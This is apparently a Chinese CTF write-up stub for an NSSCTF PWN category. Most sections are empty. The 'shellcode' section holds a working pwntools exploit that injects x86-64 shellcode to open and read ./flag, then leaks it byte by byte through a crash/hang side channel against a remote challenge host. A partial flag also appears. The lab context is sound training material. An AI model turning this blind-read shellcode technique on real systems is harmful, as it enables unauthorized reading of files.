WP官号有，到时候看
# PWN
## master_of_rop
```python


```
## onlyone
```python

```
## pwnpwn
```python

```
## shellcode
```python
from pwn import *
import sys

context(arch="amd64", os="linux", log_level="debug")
context.log_level = 'info'
elf_path = "./" + sys.argv[0][:-3]
libc_path = ""
local = True if len(sys.argv) == 1 else False

def debug():
    descript = '''
        b main
    '''
    if local:
        gdb.attach(p, descript)

def exp(dis, char):
    shellcode = asm('''
        add rsi, 0xe
        jmp rsi
    ''') + b'./flag\x00\x00'
    shellcode += asm(f'''
        mov r15, rsi
        add r15, 0x100
        mov rax, 2
        mov rdi, rsi
        sub rdi, 8
        xor rsi, rsi
        syscall

        mov rax, 0
        mov rdi, 3
        mov rsi, r15
        mov rdx, 0x100
        syscall

        add r15, {dis}
        mov dl, byte ptr[r15]
        mov cl, {char}
        cmp cl, dl
        jz loop
        mov rax, 60
        syscall

        loop:
        jmp loop
    ''')
    p.recvuntil(b'shellcode: \n')
    p.sendline(shellcode)

word = '-0123456789qwertyuiopasdfghjklzxcvbnm}{'
# NSSCTF{f80be998-f0df-4731-85
flag = 'NSSCTF{'
i = len(flag)
while not '}' in flag:
    print('--------'*10)
    for j in word:
        if local:
            p = process(elf_path)
        else:
            ip, port = "node9.anna.nssctf.cn:23623".split(":")
            p = remote(ip, port)
        try:
            log.info("now try: " + j)
            exp(i, ord(j))
            p.recvline(timeout=10)
            flag += j
            log.info("{} pos : {} success".format(i, j))
            i += 1
            log.info("flag: " + flag)
            with open("flag.txt", "w") as f:
                f.write(flag)
            pause()
            p.close()
            break
        except:
            log.info('error, try next')
            log.info('flag: ' + flag)
            p.close()

p.interactive()

```
## test_your_nc
nc题的绕过
